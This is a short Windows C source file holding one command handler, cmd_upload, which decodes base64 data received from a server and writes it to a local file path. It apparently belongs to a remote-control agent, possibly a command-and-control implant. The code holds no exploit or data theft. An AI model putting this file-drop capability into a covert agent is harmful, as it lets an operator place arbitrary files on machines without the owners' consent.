#include "commands.h"
#include "crypto.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* decode base64 data from server and write it to local_path */
int cmd_upload(const char *local_path, const char *data_b64,
               char *output_buf, size_t output_size)
{
    if (!local_path || !data_b64 || !output_buf) return -1;

    size_t   raw_len = 0;
    uint8_t *raw     = base64_decode(data_b64, &raw_len);
    if (!raw) {
        snprintf(output_buf, output_size, "[upload] base64 decode failed\n");
        return -1;
    }

    HANDLE fh = CreateFileA(
        local_path,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (fh == INVALID_HANDLE_VALUE) {
        snprintf(output_buf, output_size,
                 "[upload] CreateFile failed: %lu (path: %s)\n",
                 GetLastError(), local_path);
        free(raw);
        return -1;
    }

    DWORD written = 0;
    BOOL  ok      = WriteFile(fh, raw, (DWORD)raw_len, &written, NULL);
    CloseHandle(fh);
    free(raw);

    if (!ok || written != (DWORD)raw_len) {
        snprintf(output_buf, output_size,
                 "[upload] WriteFile failed: %lu (wrote %lu / %zu bytes)\n",
                 GetLastError(), written, raw_len);
        return -1;
    }

    snprintf(output_buf, output_size,
             "[upload] OK - wrote %zu bytes to %s\n",
             raw_len, local_path);
    return 0;
}
